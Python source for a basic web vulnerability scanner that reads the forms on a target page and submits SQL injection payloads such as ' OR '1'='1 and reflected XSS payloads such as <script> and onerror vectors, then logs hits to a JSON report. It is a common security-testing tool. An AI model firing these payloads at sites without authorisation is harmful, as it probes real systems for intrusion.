import requests
from bs4 import BeautifulSoup
import re
from urllib.parse import urljoin
import time
import json

class WebVulnerabilityScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.vulnerabilities = []
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) ScannerBot/1.0'
        }

    def scan(self):
        print(f"[*] Starting scan for: {self.target_url}")
        self.crawl_and_scan()
        self.generate_report()

    def crawl_and_scan(self):
        try:
            print("[*] Crawling website to find forms and inputs...")
            response = self.session.get(self.target_url, headers=self.headers)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find all forms
            forms = soup.find_all('form')
            print(f"[+] Found {len(forms)} forms on the page")
            
            for form in forms:
                form_details = self.get_form_details(form)
                print(f"[*] Testing form action: {form_details['action']}")
                
                # Test for SQL Injection
                self.test_sql_injection(form_details)
                
                # Test for XSS
                self.test_xss(form_details)
                
        except Exception as e:
            print(f"[-] Error during crawling: {str(e)}")

    def get_form_details(self, form):
        details = {}
        action = form.attrs.get('action', '').lower()
        method = form.attrs.get('method', 'get').lower()
        inputs = []
        
        for input_tag in form.find_all('input'):
            input_type = input_tag.attrs.get('type', 'text')
            input_name = input_tag.attrs.get('name')
            if input_name:
                inputs.append({'type': input_type, 'name': input_name})
        
        details['action'] = urljoin(self.target_url, action)
        details['method'] = method
        details['inputs'] = inputs
        return details

    def test_sql_injection(self, form_details):
        sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            '" OR "1"="1',
            "' OR 'a'='a",
            '" OR "a"="a',
            "' OR 1=1#",
            '" OR 1=1#',
            "' OR 1=1/*",
            '" OR 1=1/*'
        ]
        
        for payload in sql_payloads:
            data = {}
            for input in form_details['inputs']:
                if input['type'] == 'text' or input['type'] == 'password':
                    data[input['name']] = payload
                else:
                    data[input['name']] = input.get('value', '')
            
            try:
                if form_details['method'] == 'post':
                    response = self.session.post(form_details['action'], data=data)
                else:
                    response = self.session.get(form_details['action'], params=data)
                
                if self.is_sql_injection(response.text):
                    vulnerability = {
                        'type': 'SQL Injection',
                        'form_action': form_details['action'],
                        'payload': payload,
                        'evidence': 'Database error message detected'
                    }
                    self.vulnerabilities.append(vulnerability)
                    print(f"[!] SQL Injection vulnerability found at {form_details['action']}")
                    break
                    
            except Exception as e:
                print(f"[-] Error testing SQLi: {str(e)}")

    def is_sql_injection(self, response_text):
        errors = [
            "sql syntax",
            "mysql",
            "database",
            "syntax error",
            "unclosed quotation mark",
            "ora-",
            "microsoft ole db",
            "odbc driver"
        ]
        
        for error in errors:
            if error in response_text.lower():
                return True
        return False

    def test_xss(self, form_details):
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "'><script>alert('XSS')</script>",
            "\"><script>alert('XSS')</script>"
        ]
        
        for payload in xss_payloads:
            data = {}
            for input in form_details['inputs']:
                if input['type'] == 'text' or input['type'] == 'search':
                    data[input['name']] = payload
                else:
                    data[input['name']] = input.get('value', '')
            
            try:
                if form_details['method'] == 'post':
                    response = self.session.post(form_details['action'], data=data)
                else:
                    response = self.session.get(form_details['action'], params=data)
                
                if payload in response.text:
                    vulnerability = {
                        'type': 'Cross-Site Scripting (XSS)',
                        'form_action': form_details['action'],
                        'payload': payload,
                        'evidence': 'Payload reflected in response'
                    }
                    self.vulnerabilities.append(vulnerability)
                    print(f"[!] XSS vulnerability found at {form_details['action']}")
                    break
                    
            except Exception as e:
                print(f"[-] Error testing XSS: {str(e)}")

    def generate_report(self):
        timestamp = time.strftime("%Y%m%d-%H%M%S")
        filename = f"scan_report_{timestamp}.json"
        
        report = {
            'target_url': self.target_url,
            'scan_date': time.strftime("%Y-%m-%d %H:%M:%S"),
            'vulnerabilities': self.vulnerabilities
        }
        
        with open(filename, 'w') as f:
            json.dump(report, f, indent=4)
        
        print(f"\n[+] Scan completed. Report saved as {filename}")
        print(f"[+] Found {len(self.vulnerabilities)} vulnerabilities")

if __name__ == "__main__":
    print("""
    ███████╗ ██████╗ █████╗ ███╗   ██╗███╗   ██╗███████╗██████╗ 
    ╚══███╔╝██╔════╝██╔══██╗████╗  ██║████╗  ██║██╔════╝██╔══██╗
      ███╔╝ ██║     ███████║██╔██╗ ██║██╔██╗ ██║█████╗  ██████╔╝
     ███╔╝  ██║     ██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝  ██╔══██╗
    ███████╗╚██████╗██║  ██║██║ ╚████║██║ ╚████║███████╗██║  ██║
    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
    """)
    
    target_url = input("Enter target URL (e.g., http://testphp.vulnweb.com/): ")
    scanner = WebVulnerabilityScanner(target_url)
    scanner.scan()
